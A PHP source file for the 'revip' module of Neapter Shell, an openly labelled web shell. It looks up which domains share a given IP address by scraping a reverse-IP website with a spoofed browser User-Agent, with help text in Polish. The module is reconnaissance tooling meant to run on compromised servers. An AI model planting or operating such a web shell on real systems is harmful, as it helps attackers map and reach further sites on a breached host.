<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Reverse IP. Get domains from IP address
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleRevip extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('revip');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-26 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Revip - jakie hosty zawierają podany adres IP

	Użycie:
		revip host_lub_ip

	Przykład:
		revip przemo.org
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() !== 1) {
            return self::getHelp();
        }

        $aStream = array(
            'http' => array(
                'method' => 'GET',
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 5.1) " .
                            "AppleWebKit/537.11 (KHTML, like Gecko) " .
                            "Chrome/23.0.1271.64 Safari/537.11\r\n" .
                            "Accept: text/html,application/xhtml+xml," .
                            "application/xml;q=0.9,*/*;q=0.8\r\n"
            )
        );

        $sData = @ file_get_contents(
            'http://www.ip-adress.com/reverse_ip/' . $this->oArgs->getParam(0),
            false,
            stream_context_create($aStream)
        );

        if (!$sData) {
            return 'Nie można połączyć się z serwerem';
        }

        if (strpos($sData, 'could not be resolved. Make sure that you enter')) {
            return 'Nie można przetłumacz hosta';
        }

        if (strpos($sData, '<div id="hostcount">0 Hosts on this IP</div>')) {
            return 'Brak hostów na podanym adresie IP';
        }

        preg_match('~<table class="list">(.+?)</table>~s', $sData, $aData);
        preg_match_all('~<td>\r\n(.+?)</td>~', $aData[1], $aData);

        return sprintf(
            "Zwrócono %d witryn:\r\n\r\n  %s",
            count($aData[1]),
            implode("\r\n  ", $aData[1])
        );
    }
}
